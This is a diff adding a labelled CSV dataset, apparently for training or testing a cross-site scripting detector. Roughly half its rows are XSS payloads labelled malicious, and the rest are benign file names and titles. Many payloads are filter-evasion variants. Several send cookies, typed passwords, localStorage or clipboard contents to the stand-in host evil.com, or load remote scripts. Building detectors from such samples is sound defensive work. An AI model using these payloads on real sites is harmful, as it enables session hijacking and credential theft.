@@ -1,0 +1,522 @@
+text,label
+<script>alert(1)</script>,1
+<script>alert('XSS')</script>,1
+<script>alert(document.cookie)</script>,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+<script>new Image().src='http://evil.com/?c='+document.cookie</script>,1
+<script>eval(atob('YWxlcnQoMSk='))</script>,1
+<script>fetch('http://evil.com/log?d='+document.cookie)</script>,1
+<script src=http://evil.com/xss.js></script>,1
+<script>window.location='http://evil.com/'</script>,1
+<script>var i=new Image();i.src='http://evil.com/?'+document.cookie;</script>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert('XSS')>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img/src=x onerror=alert(1)>,1
+<img src=x onerror="javascript:alert(1)">,1
+<img src=1 onerror=alert(String.fromCharCode(88,83,83))>,1
+"<img src=""x"" onerror=""alert(1)"">",1
+<img src=x onload=alert(1)>,1
+<img src=x onmouseover=alert(1)>,1
+<svg onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<svg onload=alert('XSS')>,1
+<svg/onload=alert(document.cookie)>,1
+<svg><script>alert(1)</script></svg>,1
+<svg onload=fetch('http://evil.com/'+document.cookie)>,1
+<svg/onload="eval(atob('YWxlcnQoMSk='))">,1
+<body onload=alert(1)>,1
+<body onload=alert('XSS')>,1
+<body background="javascript:alert(1)">,1
+<input onfocus=alert(1) autofocus>,1
+<input type=text onfocus=alert(1) autofocus>,1
+<input onblur=alert(1) autofocus><input autofocus>,1
+<select onfocus=alert(1) autofocus>,1
+<textarea onfocus=alert(1) autofocus>,1
+<details open ontoggle=alert(1)>,1
+<details/open/ontoggle=alert(1)>,1
+<marquee onstart=alert(1)>,1
+<video src=x onerror=alert(1)>,1
+<video><source onerror=alert(1)>,1
+<audio src=x onerror=alert(1)>,1
+<iframe src="javascript:alert(1)">,1
+<iframe src=javascript:alert(1)>,1
+<iframe onload=alert(1)>,1
+<iframe srcdoc="<script>alert(1)</script>">,1
+<object data="javascript:alert(1)">,1
+<embed src="javascript:alert(1)">,1
+<a href="javascript:alert(1)">click</a>,1
+<a href=javascript:alert(1)>click</a>,1
+<a href="javascript:void(0)" onclick="alert(1)">link</a>,1
+<a href=# onclick=alert(1)>click</a>,1
+javascript:alert(1),1
+javascript:alert(document.cookie),1
+javascript:eval('alert(1)'),1
+javascript:void(document.cookie),1
+<div onmouseover=alert(1)>hover</div>,1
+<div style="width:100%;height:100%" onmouseover=alert(1)>,1
+<div onclick=alert(1)>click</div>,1
+<p onmouseover=alert(1)>text</p>,1
+<table background="javascript:alert(1)">,1
+<td background="javascript:alert(1)">,1
+<form action="javascript:alert(1)"><button>submit</button></form>,1
+<form><button formaction="javascript:alert(1)">X</button></form>,1
+<button onclick=alert(1)>click</button>,1
+<button onfocus=alert(1) autofocus>,1
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,1
+<xss style="xss:expression(alert('XSS'))">,1
+<div style="background:url(javascript:alert(1))">,1
+<div style="width:expression(alert(1))">,1
+<style>*{background:url('javascript:alert(1)')}</style>,1
+<link rel=stylesheet href="javascript:alert(1)">,1
+<base href="javascript:alert(1)///">,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+%3Cimg%20src=x%20onerror=alert(1)%3E,1
+%3Csvg%20onload=alert(1)%3E,1
+%3Cbody%20onload=alert(1)%3E,1
+%3Ciframe%20src=%22javascript:alert(1)%22%3E,1
+%3Ca%20href=%22javascript:alert(1)%22%3Eclick%3C/a%3E,1
+%253Cscript%253Ealert(1)%253C%252Fscript%253E,1
+%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B,1
+&#60;script&#62;alert(1)&#60;/script&#62;,1
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+\x3Cscript\x3Ealert(1)\x3C/script\x3E,1
+\u003Cscript\u003Ealert(1)\u003C/script\u003E,1
+<scr<script>ipt>alert(1)</scr</script>ipt>,1
+<scr\x00ipt>alert(1)</scr\x00ipt>,1
+<script/src="data:text/javascript,alert(1)">,1
+<script>onerror=alert;throw 1</script>,1
+<script>{onerror=alert}throw 1</script>,1
+<script>throw onerror=alert,1</script>,1
+<script>alert`1`</script>,1
+<script>alert&lpar;1&rpar;</script>,1
+<script>prompt(1)</script>,1
+<script>confirm(1)</script>,1
+<script>console.log(document.cookie)</script>,1
+<img src=x onerror=prompt(1)>,1
+<img src=x onerror=confirm(1)>,1
+<svg onload=prompt(1)>,1
+<svg onload=confirm(1)>,1
+"<img src=x onerror=""fetch('http://evil.com/'+document.cookie)"">",1
+<script>document.write('<img src=http://evil.com/steal?c='+document.cookie+'>')</script>,1
+<script>var x=new XMLHttpRequest();x.open('GET','http://evil.com/?c='+document.cookie);x.send();</script>,1
+"><script>alert(1)</script>,1
+'><script>alert(1)</script>,1
+"><img src=x onerror=alert(1)>,1
+'><img src=x onerror=alert(1)>,1
+"><svg onload=alert(1)>,1
+</title><script>alert(1)</script>,1
+</textarea><script>alert(1)</script>,1
+</style><script>alert(1)</script>,1
+--><script>alert(1)</script>,1
+*/</script><script>alert(1)</script>,1
+";alert(1)//,1
+';alert(1)//,1
+\";alert(1)//,1
+1;alert(1),1
+1');alert(1)//,1
+<script>document.querySelector('form').action='http://evil.com/phish'</script>,1
+<script>document.getElementById('password').addEventListener('change',function(){fetch('http://evil.com/?p='+this.value)})</script>,1
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">,1
+<meta http-equiv="refresh" content="0;url=http://evil.com/">,1
+<isindex type=image src=1 onerror=alert(1)>,1
+<img src=x onerror=window.open('http://evil.com/')>,1
+<script>setTimeout('alert(1)',0)</script>,1
+<script>setInterval('alert(1)',1000)</script>,1
+<img src=x onerror=setTimeout(alert,0,1)>,1
+<script>Function('alert(1)')()</script>,1
+<script>[].constructor.constructor('alert(1)')()</script>,1
+<script>window['ale'+'rt'](1)</script>,1
+<script>this['alert'](1)</script>,1
+<script>self['alert'](1)</script>,1
+<script>top['alert'](1)</script>,1
+<script>parent['alert'](1)</script>,1
+<script>frames['alert'](1)</script>,1
+<img src=x onerror=this['ale'+'rt'](1)>,1
+<svg onload=self['ale'+'rt'](1)>,1
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>,1
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>,1
+<script>eval('\141\154\145\162\164\050\061\051')</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg onload=eval(atob('YWxlcnQoMSk='))>,1
+<script>location=`javas`+`cript:ale`+`rt(1)`</script>,1
+<script>location='javascript:alert(1)'</script>,1
+<script>document.location='javascript:alert(1)'</script>,1
+<script>window.location.href='javascript:alert(1)'</script>,1
+<script>location.replace('javascript:alert(1)')</script>,1
+<script>location.assign('javascript:alert(1)')</script>,1
+<img src=x onerror="location='javascript:alert(1)'">,1
+<ScRiPt>alert(1)</ScRiPt>,1
+<sCrIpT>alert(1)</sCrIpT>,1
+<SCRIPT>alert(1)</SCRIPT>,1
+<IMG SRC=x ONERROR=alert(1)>,1
+<SVG ONLOAD=alert(1)>,1
+<BODY ONLOAD=alert(1)>,1
+<IMG SRC=X ONERROR=alert(String.fromCharCode(88,83,83))>,1
+<script>var s=document.createElement('script');s.src='http://evil.com/hook.js';document.head.appendChild(s)</script>,1
+<script>navigator.sendBeacon('http://evil.com/log',document.cookie)</script>,1
+<script>new WebSocket('ws://evil.com/').onopen=function(e){e.target.send(document.cookie)}</script>,1
+<img src=x onerror="var i=document.createElement('iframe');i.src='http://evil.com/';document.body.appendChild(i)">,1
+"><svg/onload=alert(1)//,1
+'"><svg/onload=alert(1)//,1
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>,1
+<svg><set onbegin=alert(1) attributeName=x to=1>,1
+<script>import('data:text/javascript,alert(1)')</script>,1
+<math><mi><table><mglyph><style><img src=x onerror=alert(1)>,1
+<noscript><img src=x onerror=alert(1)></noscript>,1
+<script>history.pushState(null,null,'javascript:alert(1)')</script>,1
+<image src=x onerror=alert(1)>,1
+<video poster=javascript:alert(1)>,1
+<script>crypto.subtle.digest('SHA-256',new TextEncoder().encode(document.cookie)).then(h=>fetch('http://evil.com/'+btoa(h)))</script>,1
+<style>@import'http://evil.com/steal.css';</style>,1
+<script>document.forms[0].action='http://evil.com/phish'</script>,1
+<script>new MutationObserver(()=>alert(1)).observe(document,{childList:true})</script>,1
+<script>customElements.define('x-x',class extends HTMLElement{connectedCallback(){alert(1)}})</script>,1
+<script>SharedArrayBuffer&&alert(1)</script>,1
+<img src=x onerror=import('//evil.com/xss.js')>,1
+<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/>,1
+<script>Object.defineProperty(document,'cookie',{get:()=>fetch('http://evil.com/')})</script>,1
+<style onload=alert(1)>,1
+<keygen onfocus=alert(1) autofocus>,1
+<fieldset onfocus=alert(1)><input autofocus>,1
+<output onfocus=alert(1) autofocus>,1
+<label onfocus=alert(1)><input autofocus>,1
+<meter onmouseover=alert(1)>0</meter>,1
+<progress onmouseover=alert(1)>0</progress>,1
+<datalist><option label="XSS" value="<script>alert(1)</script>">,1
+<script>postMessage(document.cookie,'*')</script>,1
+<script>addEventListener('message',e=>eval(e.data))</script>,1
+<template><script>alert(1)</script></template>,1
+<slot onfocus=alert(1) tabindex=1>,1
+<dialog open onclose=alert(1)>,1
+<script src="data:text/javascript,alert(1)"></script>,1
+<script src="data:;base64,YWxlcnQoMSk="></script>,1
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,1
+<script>Reflect.apply(alert,null,[1])</script>,1
+<script>Proxy&&alert(1)</script>,1
+<img/src/onerror=alert(1)>,1
+<img src=x:alert onerror=eval(src)>,1
+<script>TypeError.prototype.name=alert(1)</script>,1
+<script>with(document)alert(cookie)</script>,1
+<script>({}).constructor.constructor('alert(1)')()</script>,1
+<x contenteditable onblur=alert(1)>lose focus</x>,1
+<x tabindex=1 onfocus=alert(1)>focus me</x>,1
+<x onfocusin=alert(1)>focus</x>,1
+<x onfocusout=alert(1)>focus</x>,1
+<script>queueMicrotask(()=>alert(1))</script>,1
+<script>requestAnimationFrame(()=>alert(1))</script>,1
+<script>requestIdleCallback(()=>alert(1))</script>,1
+<img src=x onerror="this['parentNode']['ownerDocument']['defaultView']['alert'](1)">,1
+<svg onload="top[/al/.source+/ert/.source](1)">,1
+<img src=x onerror=alert(1)//,1
+<img src=x onerror=alert(1)/*,1
+<script>var{a:alert}={a:alert};a(1)</script>,1
+<script>globalThis.alert(1)</script>,1
+<script>Reflect.get(globalThis,'alert').call(null,1)</script>,1
+"><img src=x onerror=alert(1)><",1
+'><img src=x onerror=alert(1)><',1
+<script>[[alert(1)]]</script>,1
+<script>void(alert(1))</script>,1
+<script>~alert(1)</script>,1
+<script>!alert(1)</script>,1
+<script>-alert(1)</script>,1
+<script>+alert(1)</script>,1
+<svg onload=alert(1)//>,1
+vacation_photo.jpg,0
+summer_trip_2024.png,0
+family_reunion.heic,0
+birthday_party_video.mp4,0
+wedding_photos_final.zip,0
+IMG_20240315_143022.jpg,0
+DSC_0001.raw,0
+screenshot_2024-03-15.png,0
+profile_picture.jpeg,0
+graduation_ceremony.mov,0
+Q3_Financial_Report.pdf,0
+Annual_Budget_2024.xlsx,0
+Project_Proposal_v3.docx,0
+Meeting_Notes_2024-03-15.txt,0
+Board_Presentation_Final.pptx,0
+Tax_Return_2023.pdf,0
+Invoice_INV-2024-0042.pdf,0
+Employee_Handbook_v2.pdf,0
+Strategic_Plan_2025.docx,0
+Quarterly_Review_Q2.pptx,0
+resume_john_doe.pdf,0
+cover_letter_senior_dev.docx,0
+portfolio_design_2024.pdf,0
+recommendation_letter.pdf,0
+certification_aws_solutions.pdf,0
+transcript_university.pdf,0
+contract_employment.pdf,0
+offer_letter_final.pdf,0
+performance_review_2024.docx,0
+training_completion_cert.pdf,0
+README.md,0
+package.json,0
+index.html,0
+styles.css,0
+app.tsx,0
+server.js,0
+docker-compose.yml,0
+.gitignore,0
+tsconfig.json,0
+webpack.config.js,0
+database_backup_20240315.sql,0
+migration_v2_to_v3.sql,0
+schema.prisma,0
+seed_data.json,0
+config.yaml,0
+environment.env,0
+nginx.conf,0
+Dockerfile,0
+Makefile,0
+requirements.txt,0
+recipe_chocolate_cake.pdf,0
+workout_plan_march.xlsx,0
+grocery_list.txt,0
+travel_itinerary_paris.pdf,0
+book_notes_chapter5.docx,0
+music_playlist_summer.m3u,0
+garden_layout_plan.png,0
+home_renovation_budget.xlsx,0
+pet_vaccination_records.pdf,0
+car_maintenance_log.xlsx,0
+team_standup_notes.md,0
+sprint_retrospective_q1.docx,0
+architecture_diagram_v2.png,0
+api_documentation.md,0
+user_stories_backlog.csv,0
+test_results_report.html,0
+deployment_checklist.md,0
+incident_postmortem_0315.md,0
+code_review_guidelines.pdf,0
+onboarding_guide_new_devs.docx,0
+sales_pipeline_march.xlsx,0
+customer_feedback_q1.csv,0
+marketing_campaign_plan.pptx,0
+product_roadmap_2024.pdf,0
+competitor_analysis.docx,0
+brand_guidelines_v3.pdf,0
+social_media_calendar.xlsx,0
+press_release_draft.docx,0
+partnership_proposal.pdf,0
+market_research_findings.pptx,0
+patient_records_summary.pdf,0
+lab_results_20240315.pdf,0
+prescription_renewal.pdf,0
+insurance_claim_form.pdf,0
+appointment_schedule.xlsx,0
+medical_history_form.docx,0
+discharge_summary.pdf,0
+vaccination_card.pdf,0
+referral_letter.pdf,0
+consent_form_surgery.pdf,0
+class_schedule_spring.pdf,0
+homework_assignment_ch7.docx,0
+lecture_notes_physics.pdf,0
+study_guide_midterm.docx,0
+group_project_report.pdf,0
+thesis_draft_v4.docx,0
+lab_report_chemistry.pdf,0
+research_paper_ml.pdf,0
+course_syllabus_cs101.pdf,0
+grade_report_fall2024.pdf,0
+lease_agreement_2024.pdf,0
+mortgage_application.pdf,0
+property_inspection.pdf,0
+home_appraisal_report.pdf,0
+closing_documents.pdf,0
+rental_insurance_policy.pdf,0
+utility_bill_march.pdf,0
+maintenance_request.docx,0
+hoa_meeting_minutes.pdf,0
+property_tax_receipt.pdf,0
+My Documents,0
+Important Files,0
+Work Projects,0
+Personal Photos,0
+Financial Records,0
+Tax Documents 2024,0
+Client Presentations,0
+Research Materials,0
+Travel Plans,0
+Recipe Collection,0
+untitled_document.docx,0
+new_spreadsheet.xlsx,0
+backup_copy_20240315.zip,0
+archive_old_files.tar.gz,0
+scan_20240315_001.pdf,0
+print_receipt.pdf,0
+download_invoice.pdf,0
+attachment_email.pdf,0
+clipboard_image.png,0
+voice_memo_0315.m4a,0
+John Smith - Q1 Performance Review,0
+Alice Johnson - Project Alpha Deliverables,0
+2024 Budget Planning - Department Overview,0
+Weekly Status Report - March Week 3,0
+Client Meeting Notes - Acme Corp,0
+Product Launch Timeline - Widget Pro,0
+Engineering Hiring Plan Q2 2024,0
+Customer Support Metrics Dashboard,0
+Vendor Contract Renewal - CloudHost,0
+Team Building Event Planning,0
+My awesome photo from yesterday.jpg,0
+Notes from the meeting with Sarah.txt,0
+Updates to the project timeline.xlsx,0
+Final version of the presentation.pptx,0
+Backup of important documents.zip,0
+Screenshots for bug report #1234.png,0
+Draft email to the marketing team.txt,0
+List of action items from standup.md,0
+Expense report for March trip.pdf,0
+Ideas for the new feature brainstorm.docx,0
+hello world,0
+test file,0
+document 1,0
+my notes,0
+to do list,0
+shopping list,0
+phone numbers,0
+addresses,0
+passwords,0
+bookmarks,0
+Quick brown fox jumps over the lazy dog,0
+Lorem ipsum dolor sit amet,0
+This is a sample text file,0
+Meeting scheduled for 2pm tomorrow,0
+Please review the attached document,0
+Updated version with corrections,0
+Final draft for approval,0
+Notes from today's standup call,0
+Action items from retrospective,0
+Summary of Q1 achievements,0
+file (1).pdf,0
+file (2).pdf,0
+Copy of Budget.xlsx,0
+Budget - Copy.xlsx,0
+document_final_FINAL.docx,0
+report_v1_edited_reviewed_final2.pdf,0
+Untitled.txt,0
+New Document.docx,0
+Book1.xlsx,0
+Presentation1.pptx,0
+花火大会の写真.jpg,0
+会議議事録.pdf,0
+プロジェクト計画書.xlsx,0
+données_financières.xlsx,0
+bericht_zusammenfassung.pdf,0
+informe_trimestral.docx,0
+relatório_vendas.pdf,0
+отчёт_квартальный.pdf,0
+文件备份_20240315.zip,0
+사업계획서.pptx,0
+2024-03-15_daily_report.md,0
+2024_Q1_revenue_forecast.xlsx,0
+20240315_meeting_recording.mp4,0
+FY2024_audit_findings.pdf,0
+v2.1.0_release_notes.md,0
+sprint-42_velocity_chart.png,0
+issue-#1234_reproduction.md,0
+PR-#567_review_comments.md,0
+build-2024.03.15-hotfix.log,0
+deploy-prod-20240315.yaml,0
+normal text with special chars like & and <,0
+file with spaces in name.txt,0
+file-with-dashes.pdf,0
+file_with_underscores.docx,0
+CamelCaseFileName.tsx,0
+ALLCAPS_DOCUMENT.PDF,0
+Mixed.Case.With.Dots.pdf,0
+123_numeric_prefix.txt,0
+filename(with)parentheses.doc,0
+"file,with,commas.csv",0
+<script>alert(document.domain)</script>,1
+<script>alert(window.origin)</script>,1
+<img src onerror=alert(1)>,1
+<img/src/onerror=prompt(1)>,1
+<svg><script>prompt(1)</script>,1
+<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><text>click</text></a>,1
+<math><mrow><mi><mglyph/><img src=x onerror=alert(1)></mrow>,1
+<script>navigator.clipboard.readText().then(t=>fetch('http://evil.com/'+t))</script>,1
+<script>let c=new BroadcastChannel('x');c.onmessage=e=>alert(e.data)</script>,1
+<script>performance.getEntries().forEach(e=>fetch('http://evil.com/?u='+e.name))</script>,1
+<img src=1 onerror=import('//evil.com')>,1
+<script>document.title=document.cookie</script>,1
+<details open ontoggle=alert(document.cookie)>,1
+<marquee behavior=alternate onstart=alert(1)>,1
+<xmp><img src=x onerror=alert(1)></xmp>,1
+<listing><img src=x onerror=alert(1)></listing>,1
+<img dynsrc=javascript:alert(1)>,1
+<img lowsrc=javascript:alert(1)>,1
+<bgsound src=javascript:alert(1)>,1
+<br size="&{alert(1)}">,1
+<link rel=import href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>,1
+<script>history.replaceState(null,null,'javascript:alert(1)')</script>,1
+<script>Object.keys(localStorage).forEach(k=>fetch('http://evil.com/?'+k+'='+localStorage[k]))</script>,1
+<script>indexedDB.databases().then(d=>fetch('http://evil.com/?db='+JSON.stringify(d)))</script>,1
+<img src=x onerror="this.src='http://evil.com/pixel.gif?c='+document.cookie">,1
+<script>document.querySelectorAll('input[type=password]').forEach(i=>i.addEventListener('input',e=>fetch('http://evil.com/?p='+e.target.value)))</script>,1
+system_architecture_overview.vsdx,0
+database_er_diagram.drawio,0
+api_flowchart.svg,0
+network_topology.png,0
+class_diagram_v2.puml,0
+sequence_diagram_auth.png,0
+wireframe_dashboard.fig,0
+mockup_landing_page.sketch,0
+design_system_tokens.json,0
+component_library_docs.md,0
+server_access_log_20240315.log,0
+error_log_production.log,0
+audit_trail_march.csv,0
+performance_metrics_q1.json,0
+monitoring_dashboard_config.yaml,0
+alerting_rules.yml,0
+terraform_main.tf,0
+ansible_playbook.yml,0
+kubernetes_deployment.yaml,0
+helm_chart_values.yaml,0
+unit_test_results.xml,0
+integration_test_report.html,0
+load_test_summary.pdf,0
+security_scan_results.json,0
+code_coverage_report.html,0
+dependency_audit.json,0
+lighthouse_report.html,0
+accessibility_audit.pdf,0
+browser_compatibility.xlsx,0
+regression_test_matrix.xlsx,0
+standard_operating_procedure.pdf,0
+change_management_request.docx,0
+risk_assessment_matrix.xlsx,0
+disaster_recovery_plan.pdf,0
+business_continuity_plan.docx,0
+data_classification_policy.pdf,0
+access_control_matrix.xlsx,0
+compliance_checklist_gdpr.xlsx,0
+privacy_impact_assessment.pdf,0
+security_awareness_training.pptx,0
+wedding_invitation_design.ai,0
+birthday_card_template.psd,0
+family_tree_updated.pdf,0
+vacation_checklist_hawaii.docx,0
+home_insurance_policy.pdf,0
+car_registration_renewal.pdf,0
+tax_deductions_tracker.xlsx,0
+savings_goal_planner.xlsx,0
+meal_prep_weekly_plan.pdf,0
+fitness_tracking_log.xlsx,0
+inventory_management_q1.xlsx,0
+supply_chain_analysis.pdf,0
+procurement_order_PO2024.pdf,0
+warehouse_layout_plan.dwg,0
+shipping_manifest_0315.csv,0
+quality_control_report.pdf,0
+production_schedule_week12.xlsx,0
+material_safety_datasheet.pdf,0
+equipment_maintenance_log.xlsx,0
+environmental_impact_report.pdf,0
